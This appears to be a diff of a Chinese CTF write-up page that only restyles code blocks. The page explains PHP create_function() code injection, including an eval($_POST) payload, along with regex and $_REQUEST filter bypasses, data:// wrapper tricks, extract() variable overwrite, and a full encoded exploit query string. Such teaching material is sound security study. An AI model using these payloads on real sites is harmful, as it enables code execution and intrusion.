@@ -165,15 +165,18 @@
 <span class="token variable">$myFunc</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$a,$b'</span><span class="token punctuation">,</span><span class="token string">'return($a+$b)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$myFunc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 <p>实际上，<code>myFunc()</code>就相当于：</p>
-<pre><code>function myFunc($a, $b){
-    return $a+$b;
-}</code></pre><p>这看似正常，实则充满危险。由于<code>$code</code>可控，底层又没有响应的保护参数，就导致出现了代码注入。见如下例子：</p>
-<pre><code>&lt;?php
-$myFunc = create_function(&#39;$a, $b&#39;, &#39;return($a+$b);}eval($_POST[&#39;Y1ng&#39;]);\\&#39;);</code></pre><p>执行时的<code>myFunc()</code>为：</p>
-<pre><code>function myFunc($a, $b){
-    return $a+$b;
-}
-eval($_POST[&#39;Y1ng&#39;]);//}</code></pre><p>通过手工闭合<code>}</code>使后面的代码<code>eval()</code>逃逸出了<code>myFunc()</code>得以执行，然后利用注释符<code>//</code>注释掉<code>}</code>保证了语法正确。</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">myFunc</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>这看似正常，实则充满危险。由于<code>$code</code>可控，底层又没有响应的保护参数，就导致出现了代码注入。见如下例子：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$myFunc</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$a, $b'</span><span class="token punctuation">,</span> <span class="token string">'return($a+$b);}eval($_POST['</span>Y1ng<span class="token string">']);\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>执行时的<code>myFunc()</code>为：</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">myFunc</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Y1ng'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//}</span></code></pre>
+<p>通过手工闭合<code>}</code>使后面的代码<code>eval()</code>逃逸出了<code>myFunc()</code>得以执行，然后利用注释符<code>//</code>注释掉<code>}</code>保证了语法正确。</p>
 <h4 id="一道ctf"><a href="#一道ctf" class="headerlink" title="一道ctf"></a>一道ctf</h4><p>通过代码审计来学习一下各种bypass：</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -274,25 +277,27 @@ $_SERVER[&quot;PHP_SELF&quot;] 当前正在执行脚本的文件名</code></pre>
 <span class="token punctuation">}</span> </code></pre>
 <p>看这段代码（先不管他外面那个禁止RFI的if条件），<code>/^y1ngzuishuai$/</code>中<code>^</code>匹配起始、<code>$</code>匹配结束，但又不能是y1ngzuishuai。</p>
 <p>对于这种正则匹配，可以使用<code>%0a</code>换行污染绕过，payload:</p>
-<pre><code>?zuishuai=y1ngzuishuai%0a</code></pre><h5 id="考点3：绕过-REQUEST的字母匹配"><a href="#考点3：绕过-REQUEST的字母匹配" class="headerlink" title="考点3：绕过$_REQUEST的字母匹配"></a>考点3：绕过$_REQUEST的字母匹配</h5><pre><code>if($_REQUEST) { 
-    foreach($_REQUEST as $value) { 
-        if(preg_match(&#39;/[a-zA-Z]/i&#39;, $value))  
-            die(&#39;fxck your English letters&#39;); 
-    } 
-}</code></pre><p><code>foreach</code>循环遍历<code>$_REQUEST</code>数组，将键值赋给<code>$value</code>，然后检测<code>$value</code>是否包含字母，若是 则<code>die()</code>。</p>
+<pre><code>?zuishuai=y1ngzuishuai%0a</code></pre><h5 id="考点3：绕过-REQUEST的字母匹配"><a href="#考点3：绕过-REQUEST的字母匹配" class="headerlink" title="考点3：绕过$_REQUEST的字母匹配"></a>考点3：绕过$_REQUEST的字母匹配</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck your English letters'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">}</span> 
+<span class="token punctuation">}</span></code></pre>
+<p><code>foreach</code>循环遍历<code>$_REQUEST</code>数组，将键值赋给<code>$value</code>，然后检测<code>$value</code>是否包含字母，若是 则<code>die()</code>。</p>
 <p>根据题目可知，我们必须要<code>$_GET[]</code>一些东西，比如考点2中的<code>y1ngzuishuai%0a</code>。我们知道<code>$_REQUEST</code>同时接受GET和POST的数据，并且POST具有更高的优先值。</p>
 <p>因此对于需要GET的一些参数，比如<code>zuishuai</code>，只需要同时POST一个数字即可绕过：</p>
-<h5 id="考点4：绕过文件内容读取的比较"><a href="#考点4：绕过文件内容读取的比较" class="headerlink" title="考点4：绕过文件内容读取的比较"></a>考点4：绕过文件内容读取的比较</h5><pre><code>$file = &quot;1nD3x.php&quot;;
-if (!preg_match(&#39;/http/i&#39;, $_GET[&#39;file&#39;])) {
-        if (preg_match(&#39;/^y1ngzuishuai$/&#39;, $_GET[&#39;zuishuai&#39;]) &amp;&amp; $_GET[&#39;zuishuai&#39;] !== &#39;y1ngzuishuai&#39;) { 
-                $file = $_GET[&quot;file&quot;]; 
-        echo &quot;Yes! You know that I zuishuai!&lt;br&gt;&quot;;
-    } 
-} else 
-        die(&#39;fxck you! no RFI!!&#39;);
+<h5 id="考点4：绕过文件内容读取的比较"><a href="#考点4：绕过文件内容读取的比较" class="headerlink" title="考点4：绕过文件内容读取的比较"></a>考点4：绕过文件内容读取的比较</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"1nD3x.php"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^y1ngzuishuai$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'zuishuai'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'zuishuai'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'y1ngzuishuai'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+                <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
+        <span class="token keyword">echo</span> <span class="token string">"Yes! You know that I zuishuai!&lt;br>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> 
+<span class="token punctuation">}</span> <span class="token keyword">else</span> 
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! no RFI!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-if (file_get_contents($file) !== &#39;y1ng_YuZhou_Wudi_zuishuai&#39;)
-        die(&#39; Am not I universe wudi zuishuai?&lt;br&gt;&#39;);</code></pre><p>只要绕过y1ngzuishuai后，<code>$file</code>变量就可控了，但是没有任何一个本地文件的内容是y1ng_YuZhou….，正则匹配了http又无法远程文件包含。所以需要构造出一个<code>$file</code>，使<code>file_get_contents()</code>返回题目要的字符串。</p>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'y1ng_YuZhou_Wudi_zuishuai'</span><span class="token punctuation">)</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">' Am not I universe wudi zuishuai?&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>只要绕过y1ngzuishuai后，<code>$file</code>变量就可控了，但是没有任何一个本地文件的内容是y1ng_YuZhou….，正则匹配了http又无法远程文件包含。所以需要构造出一个<code>$file</code>，使<code>file_get_contents()</code>返回题目要的字符串。</p>
 <p><code>data://</code>伪协议使用方法如下：</p>
 <pre><code>data://text/plain,&lt;?php phpinfo()?&gt;
 data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></pre><p>但是本题目只<code>file_get_contents()</code>来做比较判断并不包含，因此无法通过<code>data://</code>进行RCE，却可以用来绕过比较。payload：</p>
@@ -310,18 +315,20 @@ data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></pre><p>但是本题目
 <p><strong>总结</strong>一下上面5个小考点的payload</p>
 <pre><code>?zuishuai=y1ngzuishuai%0a&amp;y1ng[]=1&amp;passwd[]=2&amp;file=data://text/plain,y1ng_YuZhou_Wudi_zuishuai</code></pre><p>编码后为</p>
 <pre><code>?%7a%75%69%73%68%75%61%69=%79%31%6e%67%7a%75%69%73%68%75%61%69%25%30%61&amp;%79%31%6e%67%5b%5d=%31&amp;%70%61%73%73%77%64%5b%5d=%32&amp;%66%69%6c%65=%64%61%74%61://%74%65%78%74/%70%6c%61%69%6e%2c%79%31%6e%67%5f%59%75%5a%68%6f%75%5f%57%75%64%69%5f%7a%75%69%73%68%75%61%69</code></pre><p>别忘了Post:</p>
-<pre><code>zuishuai=1&amp;file=1</code></pre><h5 id="考点6，create-function-代码注入"><a href="#考点6，create-function-代码注入" class="headerlink" title="考点6，create_function()代码注入"></a>考点6，create_function()代码注入</h5><pre><code>$arg = &#39;&#39;;
-$code = &#39;&#39;;
-if ( sha1($y1ng) === sha1($passwd) &amp;&amp; $y1ng != $passwd ){
-    extract($_GET[&quot;flag&quot;]);
-    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;
-}</code></pre><pre><code>if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $code) || 
-preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#39;, $arg)  ) { 
-    die(&#39;fxck you! Read my Regular Express1on!&#39;); 
-} else { 
-    include &quot;flag.php&quot;;
-    $code(&#39;&#39;, $arg); 
-} ?&gt;</code></pre><p>这里其实ban了的关键字大多数都是根据无参数RCE能用到的函数来ban的。</p>
+<pre><code>zuishuai=1&amp;file=1</code></pre><h5 id="考点6，create-function-代码注入"><a href="#考点6，create-function-代码注入" class="headerlink" title="考点6，create_function()代码注入"></a>考点6，create_function()代码注入</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$y1ng</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$y1ng</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> 
+<span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! Read my Regular Express1on!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> 
+    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
+    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre>
+<p>这里其实ban了的关键字大多数都是根据无参数RCE能用到的函数来ban的。</p>
 <p><code>$arg</code>和<code>$code</code>变量都是可控的，因为<code>extract()</code>函数使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量。因此只要<code>extract()</code>内的数组键名为<code>arg</code>和<code>code</code>，键值为我们构造的用来注入的代码，即可实现<code>$arg</code>和<code>$code</code>的变量覆盖，导致代码注入。payload:</p>
 <pre><code>&amp;flag[arg]=}a();//&amp;flag[code]=create_function</code></pre><p>这样就会执行<code>a();</code> ，这个<code>a()</code>只是个暂时性演示，接下来再考虑到底执行什么php命令来得到flag</p>
 <p>现在的困难：</p>
